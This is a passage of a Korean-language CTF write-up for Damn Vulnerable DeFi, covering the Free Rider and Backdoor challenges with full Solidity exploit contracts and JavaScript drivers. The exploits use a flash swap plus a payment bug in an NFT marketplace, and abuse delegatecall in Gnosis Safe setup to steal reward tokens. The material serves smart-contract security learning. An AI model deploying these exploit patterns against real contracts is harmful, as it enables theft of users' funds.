</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">borrow</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1000000&#34;</span>));
</code></pre></div><hr>
<h2 id="-10-free-rider"># 10. Free rider<a hidden class="anchor" aria-hidden="true" href="#-10-free-rider">#</a></h2>
<h3 id="summary-9">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-9">#</a></h3>
<p>DVNFT를 거래할 수 있는 마켓이 있고, 해당 마켓에는 초기에 발행된 6개의 NFT가 각각 15 ETH에 판매되고 있다.</p>
<p>해당 마켓에 있는 모든 NFT가 drain될 수 있는 취약점이 있는데, buyer는 방법을 몰라 공격자에게 의뢰한 상황이다.</p>
<p>공격자는 0.5 ETH로 시작하며, 해당 마켓으로부터 6개의 NFT 토큰을 빼와 buyer에게 전달하면 대가로 45 ETH를 받을 수 있다.</p>
<p><code>FreeRiderNFTMArketplace.sol</code>의 <code>_buyOne()</code>에 취약점이 존재한다.</p>
<p>NFT를 15 ETH에 구매한 buyer에게 토큰을 전송한 뒤 원래 owner인 seller에게 15 ETH의 금액을 전송해야하는데, 다음 코드처럼 새로운 owner인 buyer에게 금액을 전송하게 된다.</p>
<p><strong>-&gt; 공격자는 15 ETH 만 있으면 마켓내 모든 NFT 토큰을 구매할 수 있다.</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// FreeRiderNFTMArketplace.sol
</span><span style="color:#75715e"></span>...
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_buyOne</span>(<span style="color:#66d9ef">uint256</span> tokenId) <span style="color:#66d9ef">private</span> {       
    <span style="color:#66d9ef">uint256</span> priceToPay <span style="color:#f92672">=</span> offers[tokenId];
    require(priceToPay <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Token is not being offered&#34;</span>);

    require(msg.value <span style="color:#f92672">&gt;=</span> priceToPay, <span style="color:#e6db74">&#34;Amount paid is not enough&#34;</span>);

    amountOfOffers<span style="color:#f92672">--</span>;

    <span style="color:#75715e">// Vulnerability : NFT를 safeTransferFrom(token.ownerOf(tokenId))로 보내면, 해당 NFT 토큰의 owner가 새 buyer로 바뀐다
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//                 그 이후에 token.ownerOf(tokenId).sendValue() 호출 시 지불금액이 seller가 아닌 buyer에게 다시 돌아감!
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// transfer from seller to buyer
</span><span style="color:#75715e"></span>    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

    <span style="color:#75715e">// pay seller
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">payable</span>(token.ownerOf(tokenId)).sendValue(priceToPay);      <span style="color:#75715e">// vulnerable
</span><span style="color:#75715e"></span>
    emit NFTBought(msg.sender, tokenId, priceToPay);
}    
...
</code></pre></div><p>공격자는 0.5 ETH 밖에 없기 때문에, UniswapV2의 Flash Swap을 이용하여 ETH를 대출하여 마켓내 모든 NFT 토큰을 가져올 수 있다.</p>
<ul>
<li>(1) UniswapV2 Flash Swap을 통해 15 ETH 대출 (Borrow)</li>
<li>(2) 취약점을 이용하여 마켓내 모든 NFT 토큰 drain</li>
<li>(3) UniswapV2 Flash Swap에 15 ETH 상환 (Pay Back)</li>
<li>(4) 모든 NFT 토큰을 buyer에게 전송하여, 45 ETH 수령</li>
</ul>
<h3 id="exploit-9">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-9">#</a></h3>
<p><strong>attacker-contracts/FlashLoanFreeRider.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&#34;</span>;

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IUniswapV2Pair</span> {
    <span style="color:#75715e">// token0 : weth
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// token1 : DTV
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">swap</span>(<span style="color:#66d9ef">uint</span> amount0Out, <span style="color:#66d9ef">uint</span> amount1Out, <span style="color:#66d9ef">address</span> to, <span style="color:#66d9ef">bytes</span> calldata data) <span style="color:#66d9ef">external</span>;
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IWETH9</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>);
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deposit</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint</span> wad) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> dst, <span style="color:#66d9ef">uint</span> wad) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IFreeRiderNFTMarketplace</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">buyMany</span>(<span style="color:#66d9ef">uint256</span>[] calldata tokenIds) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>;
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IERC721</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safeTransferFrom</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">from</span>, <span style="color:#66d9ef">address</span> to, <span style="color:#66d9ef">uint256</span> tokenId) <span style="color:#66d9ef">external</span>;
}

<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanFreeRider</span> {

    <span style="color:#66d9ef">address</span> uniswapPair;
    <span style="color:#66d9ef">address</span> weth;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> nftMarketplace;
    <span style="color:#66d9ef">address</span> damnNft;
    <span style="color:#66d9ef">address</span> buyer;

    <span style="color:#66d9ef">uint256</span>[] <span style="color:#66d9ef">public</span> tokenIds <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>];

    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _uniswapPair, <span style="color:#66d9ef">address</span> _weth, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _nftMarketplace, <span style="color:#66d9ef">address</span> _damnNft, <span style="color:#66d9ef">address</span> _buyer) {
        uniswapPair <span style="color:#f92672">=</span> _uniswapPair;
        weth <span style="color:#f92672">=</span> _weth;
        nftMarketplace <span style="color:#f92672">=</span> _nftMarketplace;
        damnNft <span style="color:#f92672">=</span> _damnNft;
        buyer <span style="color:#f92672">=</span> _buyer;
    }

    <span style="color:#75715e">// UniswapV2&#39;s Flash Loan Interface
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">uniswapV2Call</span>(<span style="color:#66d9ef">address</span> sender, <span style="color:#66d9ef">uint</span> amount0, <span style="color:#66d9ef">uint</span> amount1, <span style="color:#66d9ef">bytes</span> calldata data) <span style="color:#66d9ef">external</span> {
        IWETH9(weth).withdraw(amount0); <span style="color:#75715e">// Borrow : received FlashLoan WETH -&gt; ETH
</span><span style="color:#75715e"></span>
        IFreeRiderNFTMarketplace(nftMarketplace).buyMany{value<span style="color:#f92672">:</span> <span style="color:#66d9ef">address</span>(this).balance}(tokenIds);   <span style="color:#75715e">// drain all NFT Token from marketplace
</span><span style="color:#75715e"></span>
        IWETH9(weth).deposit{value<span style="color:#f92672">:</span> <span style="color:#66d9ef">address</span>(this).balance}(); <span style="color:#75715e">// ETH -&gt; WETH
</span><span style="color:#75715e"></span>
        IWETH9(weth).transfer(uniswapPair, IWETH9(weth).balanceOf(<span style="color:#66d9ef">address</span>(this)));  <span style="color:#75715e">// Pay back to FlashLoan
</span><span style="color:#75715e"></span>
        <span style="color:#75715e">// Send NFT tokens to buyer
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">uint256</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> ; i<span style="color:#f92672">&lt;</span>tokenIds.length ; i<span style="color:#f92672">++</span>) {
            IERC721(damnNft).safeTransferFrom(<span style="color:#66d9ef">address</span>(this), buyer, i);
        }
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onERC721Received</span>(<span style="color:#66d9ef">address</span>, <span style="color:#66d9ef">address</span>, <span style="color:#66d9ef">uint256</span> _tokenId, <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bytes4</span>) {  
        <span style="color:#66d9ef">return</span> IERC721Receiver.onERC721Received.selector;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">uint256</span> _flashLoanAmount) <span style="color:#66d9ef">external</span> {
        <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;EXPLOIT&#34;</span>;
        IUniswapV2Pair(uniswapPair).swap(_flashLoanAmount, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">address</span>(this), data);
    }

    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
}
</code></pre></div><p><strong>free-rider.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// FreeRiderNFTMarketplace._buyOne()의 취약점으로 인해 15 ETH(NFT 1개당 가격)만 있으면 모든 NFT를 빼내올 수 있다.
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// UniswapV2의 FlashLoan 이용! - UniswapV2Pair.sol -&gt; swap()
</span><span style="color:#75715e">// attacker-contracts/FlashLoanFreeRider.sol
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploitContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanFreeRider&#39;</span>, <span style="color:#a6e22e">attacker</span>)).<span style="color:#a6e22e">deploy</span>(
                                                                                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapPair</span>.<span style="color:#a6e22e">address</span>,
                                                                                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">address</span>,
                                                                                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">marketplace</span>.<span style="color:#a6e22e">address</span>,
                                                                                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">nft</span>.<span style="color:#a6e22e">address</span>,
                                                                                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buyerContract</span>.<span style="color:#a6e22e">address</span>,
                                                                                        );

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploitContract</span>.<span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;15&#34;</span>));
</code></pre></div><hr>
<h2 id="-11-backdoor"># 11. Backdoor<a hidden class="anchor" aria-hidden="true" href="#-11-backdoor">#</a></h2>
<h3 id="summary-10">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-10">#</a></h3>
<p>Gnosis Safe Wallet 레지스트리가 배포되었으며, 해당 레지스트리를 이용하여 지갑을 등록 및 deploy 시 보상으로 10 DTV 토큰을 받을 수 있다.</p>
<p>해당 레지스트리는 GnosisSafeProxyFactory를 이용하여 Safety Check를 수행한다.</p>
<p>현재 WalletRegistry에 benficiary로 등록된 사용자는 Alice, Bob, Charile, David 네 명이다.</p>
<p>WalletRegistry는 네 명의 사용자에게 보상으로 지급할 40 DTV 토큰을 가지고 있으며, 네 사용자가 WalletRegistry를 이용하여 지갑을 생성/배포 시 보상으로 해당 지갑에 토큰(10 DTV)을 받을 수 있다.</p>
<p>공격자는 해당 WalletRegistry로부터 40 DTV 토큰을 가져오는 것이 목표이다.</p>
<p>각 사용자의 EOA는 현재 GnosisSafeProxyFactory를 통한 Proxy 컨트랙트 배포 이전에 beneficiary로 등록만 된 상태이다.</p>
<p><code>GnosisSafeProxyFactory::createProxyWithCallback()</code>을 통해 지갑이 생성 및 배포되며, 전달된 콜백함수(<code>WalletRegistry::proxyCreated()</code>)에 의해 지갑 관련 모듈 세팅이나 보상 토큰 지급 등의 모듈 코드를 실행하게 된다.</p>
<p><strong>지갑 생성/배포 및 보상 분배 과정</strong></p>
<ul>
<li>
<p>(1) <code>GnosisSafe</code>(masterCopy) 및 <code>GnosisSafeProxyFactory</code>(walletFactory) 배포 (실제 환경에서는 이미 mainnet이나 testnet에 배포되어 있음)</p>
</li>
<li>
<p>(2) WalletRegistry 배포</p>
<ul>
<li>생성자(constructor)에 <code>GnosisSafe</code> / <code>GnosisSafeProxyFactory</code> 컨트랙트 주소 전달</li>
<li>두 컨트랙트 주소는  <code>WalletRegistry::proxyCreated()</code>에서 사용</li>
</ul>
</li>
<li>
<p>(3) 지갑 배포/생성을 원하는 사용자가 <code>GnosisSafeProxyFactory::createProxyWithCallback()</code> 호출하여 지갑 생성/배포 수행</p>
<ul>
<li>이 때, 보상 수령을 위해 생성 이후 호출할 콜백함수를 <code>WalletRegistry::proxyCreated()</code>로 지정</li>
</ul>
<p><strong>GnosisSafeProxyFactory.sol</strong></p>
<pre tabindex="0"><code>  ...
  /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
  /// @param _singleton Address of singleton contract.
  /// @param initializer Payload for message call sent to new proxy contract.
  /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
  /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
  function createProxyWithCallback(
      address _singleton,
      bytes memory initializer,
      uint256 saltNonce,
      IProxyCreationCallback callback
  ) public returns (GnosisSafeProxy proxy) {
      uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
      proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
      if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
  }
  ...
</code></pre><ul>
<li>해당 함수는 새로운 프록시 컨트랙트를 생성하는 용도로 사용되며, 아래와 같은 인자 사용</li>
<li><code>address _singleton</code> : 싱글턴 컨트랙트의 주소로 <code>GnosisSafe</code>(masterCopy) 사용</li>
<li><code>bytes memory initializer</code> : 새로 생성되는 프록시 컨트랙트에서 메시지 콜로 실행할 페이로드 전달</li>
<li><code>uint256 saltNonce</code> : 새로운 프록시 컨트랙트의 주소 생성 시 솔트 값으로 사용</li>
<li><code>IProxyCreateCallback callback</code> : 새로운 프록시 컨트랙트가 생성 및 배포된 후 실행할 콜백함수</li>
</ul>
</li>
<li>
<p>(4) <code>WalletRegistry::proxyCreated()</code>가 개발자가 구현해놓은 콜백함수</p>
<ul>
<li>기존에 등록된 beneficiary 사용자가 <code>GnosisSafeProxyFactory::createProxyWithCallback()</code>를 호출하여 지갑 생성/배포 시에, 10 DTV 토큰을 보상받도록 구현</li>
</ul>
</li>
</ul>
<p><strong>WalletRegistry.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity">...
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">proxyCreated</span>(
    GnosisSafeProxy proxy,
    <span style="color:#66d9ef">address</span> singleton,
    <span style="color:#66d9ef">bytes</span> calldata initializer,
    <span style="color:#66d9ef">uint256</span>
) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">override</span> {
    <span style="color:#75715e">// Make sure we have enough DVT to pay
</span><span style="color:#75715e"></span>    require(token.balanceOf(<span style="color:#66d9ef">address</span>(this)) <span style="color:#f92672">&gt;=</span> TOKEN_PAYMENT, <span style="color:#e6db74">&#34;Not enough funds to pay&#34;</span>);

    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> walletAddress <span style="color:#f92672">=</span> <span style="color:#66d9ef">payable</span>(proxy);

    <span style="color:#75715e">// Ensure correct factory and master copy
</span><span style="color:#75715e"></span>    require(msg.sender <span style="color:#f92672">==</span> walletFactory, <span style="color:#e6db74">&#34;Caller must be factory&#34;</span>);
    require(singleton <span style="color:#f92672">==</span> masterCopy, <span style="color:#e6db74">&#34;Fake mastercopy used&#34;</span>);
    
    <span style="color:#75715e">// Ensure initial calldata was a call to `GnosisSafe::setup`
</span><span style="color:#75715e"></span>    require(<span style="color:#66d9ef">bytes4</span>(initializer[<span style="color:#f92672">:</span><span style="color:#ae81ff">4</span>]) <span style="color:#f92672">==</span> GnosisSafe.setup.selector, <span style="color:#e6db74">&#34;Wrong initialization&#34;</span>);              <span style="color:#75715e">// payload : initialzer는 setup() 호출만 가능
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Ensure wallet initialization is the expected
</span><span style="color:#75715e"></span>    require(GnosisSafe(walletAddress).getThreshold() <span style="color:#f92672">==</span> MAX_THRESHOLD, <span style="color:#e6db74">&#34;Invalid threshold&#34;</span>);
    require(GnosisSafe(walletAddress).getOwners().length <span style="color:#f92672">==</span> MAX_OWNERS, <span style="color:#e6db74">&#34;Invalid number of owners&#34;</span>);       

    <span style="color:#75715e">// Ensure the owner is a registered beneficiary
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">address</span> walletOwner <span style="color:#f92672">=</span> GnosisSafe(walletAddress).getOwners()[<span style="color:#ae81ff">0</span>];

    require(beneficiaries[walletOwner], <span style="color:#e6db74">&#34;Owner is not registered as beneficiary&#34;</span>);

    <span style="color:#75715e">// Remove owner as beneficiary
</span><span style="color:#75715e"></span>    _removeBeneficiary(walletOwner);

    <span style="color:#75715e">// Register the wallet under the owner&#39;s address
</span><span style="color:#75715e"></span>    wallets[walletOwner] <span style="color:#f92672">=</span> walletAddress;

    <span style="color:#75715e">// Pay tokens to the newly created wallet
</span><span style="color:#75715e"></span>    token.transfer(walletAddress, TOKEN_PAYMENT);        
}
</code></pre></div><p>GnosisSafeProxyFactory::createProxyWithCallback() 호출을 통해 지갑 배포/생성 시, 생성되는 지갑(프록시 컨트랙트)에서 실행할 페이로드를 <code>bytes memory initializer</code> 통해 전달할 수 있으며, 해당 페이로드는 callback 함수인 proxyCreated()에 전달된다.</p>
<p>이후 proxyCreated() 함수에서는 initializer 데이터를 통해 GnosisSafe::setup() 함수만 호출이 가능하도록 개발되어 있다.</p>
<p><strong>GnosisSafe.sol</strong></p>
<pre tabindex="0"><code>...
/// @dev Setup function sets initial storage of contract.
/// @param _owners List of Safe owners.
/// @param _threshold Number of required confirmations for a Safe transaction.
/// @param to Contract address for optional delegate call.
/// @param data Data payload for optional delegate call.
/// @param fallbackHandler Handler for fallback calls to this contract
/// @param paymentToken Token that should be used for the payment (0 is ETH)
/// @param payment Value that should be paid
/// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,                         // optional : delegate call 실행할 대상 주소
    bytes calldata data,                // optional : delegate call로 실행할 데이터
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external {
    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    setupModules(to, data);     // *** delegate call!

    if (payment &gt; 0) {
        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
        // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment
        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    }
    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
}
...
</code></pre><h3 id="exploit-10">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-10">#</a></h3>
<p><code>GnosisSafe::setup()</code>는 <code>setupModules()</code> 함수를 통해 전달된 call data를 실행하며, delegate call 을 사용하기 때문에 취약점이 발생</p>
<p>공격자는 기등록된 beneficiary의 EOA를 이용해 <code>GnosisSafeProxyFactory::createProxyWithCallback()</code>를 호출하여 지갑을 생성/배포한다.</p>
<p>호출 시, <code>initializer</code>는 <code>GnosisSafe::setup()</code>을 실행하며, 인자는 다음과 같이 설정한다.</p>
<ul>
<li><code>address[] calldata _ownsers</code> : beneficiary EOA</li>
<li><code>address to</code> : 공격자 컨트랙트 주소</li>
<li><code>bytes calldata data</code> : delegate call로 실행될 페이로드이며, 공격자 컨트랙트에 구현된 drainEther()를 호출하도록 구성</li>
</ul>
<p>호출 시, 콜백함수는 <code>WalletRegistry::proxyCreated()</code>를 사용한다.</p>
<p><strong>BackdoorExploit.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span>;
<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&#34;</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&#34;</span>;

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IGnosisSafeProxyFactor</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">createProxyWithCallback</span>(<span style="color:#66d9ef">address</span> _singleton, <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> initializer, <span style="color:#66d9ef">uint256</span> saltNonce, IProxyCreationCallback callback) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (GnosisSafeProxy proxy);
}

<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">BackdoorExploit</span> {

    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> proxyFactor;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> walletRegistry;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> gnosisMaster;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> dtvToken;

    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _proxyFactor, <span style="color:#66d9ef">address</span> _walletRegistry, <span style="color:#66d9ef">address</span> _gnosisMaster, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _dtvToken) {
        proxyFactor <span style="color:#f92672">=</span> _proxyFactor;
        walletRegistry <span style="color:#f92672">=</span> _walletRegistry;
        gnosisMaster <span style="color:#f92672">=</span> _gnosisMaster;
        dtvToken <span style="color:#f92672">=</span> _dtvToken;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">drainEther</span>(<span style="color:#66d9ef">address</span> spender, <span style="color:#66d9ef">address</span> token) <span style="color:#66d9ef">external</span> {
        IERC20(token).approve(spender, <span style="color:#ae81ff">10</span> <span style="color:#66d9ef">ether</span>);
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9ef">address</span> _attacker, <span style="color:#66d9ef">address</span>[] <span style="color:#66d9ef">memory</span> _users, <span style="color:#66d9ef">uint256</span> amounts) <span style="color:#66d9ef">external</span> {
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">uint8</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> ; i<span style="color:#f92672">&lt;</span>_users.length ; i<span style="color:#f92672">++</span>) {
            <span style="color:#66d9ef">address</span>[] <span style="color:#66d9ef">memory</span> users <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">address</span>[](<span style="color:#ae81ff">1</span>);
            users[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> _users[i];

            <span style="color:#75715e">// setupModules()&#39;s delegatecall() allows an attacker to use user-defined function drainEther().
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> encodedPayload <span style="color:#f92672">=</span> abi.encodeWithSignature(<span style="color:#e6db74">&#34;drainEther(address,address)&#34;</span>, <span style="color:#66d9ef">address</span>(this), dtvToken);

            <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> initializer <span style="color:#f92672">=</span> abi.encodeWithSignature(<span style="color:#e6db74">&#34;setup(address[],uint256,address,bytes,address,address,uint256,address)&#34;</span>,
                                                                users, 
                                                                <span style="color:#ae81ff">1</span>, 
                                                                <span style="color:#66d9ef">address</span>(this), 
                                                                encodedPayload, 
                                                                <span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>), 
                                                                <span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>), 
                                                                <span style="color:#ae81ff">0</span>, 
                                                                <span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0</span>));

            <span style="color:#75715e">// when attacker&#39;s proxy contract deployed and initialized, user&#39;s DTV token benefit transfer approved by &#39;setup() -&gt; setupModules() -&gt; delegatecall(drainEther())&#39;
</span><span style="color:#75715e"></span>            GnosisSafeProxy proxy <span style="color:#f92672">=</span> IGnosisSafeProxyFactor(proxyFactor).createProxyWithCallback(gnosisMaster, initializer, <span style="color:#ae81ff">0</span>, IProxyCreationCallback(walletRegistry));

            <span style="color:#75715e">// after each user deploys and initalizes the wallet proxy contract, attacker receives ether using transferFrom() : user -&gt; attacker
</span><span style="color:#75715e"></span>            IERC20(dtvToken).transferFrom(<span style="color:#66d9ef">address</span>(proxy), _attacker, amounts);            
        }
    }

    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
}
</code></pre></div><p><strong>backdoor.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploitContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (
            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;BackdoorExploit&#39;</span>, <span style="color:#a6e22e">attacker</span>)
        ).<span style="color:#a6e22e">deploy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">walletFactory</span>.<span style="color:#a6e22e">address</span>,
                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">walletRegistry</span>.<span style="color:#a6e22e">address</span>, 
                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">masterCopy</span>.<span style="color:#a6e22e">address</span>, 
                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>);

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploitContract</span>.<span style="color:#a6e22e">exploit</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">users</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;10&#34;</span>));
</code></pre></div><hr>
<h2 id="-12-climber"># 12. Climber<a hidden class="anchor" aria-hidden="true" href="#-12-climber">#</a></h2>
<h3 id="summary-11">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-11">#</a></h3>
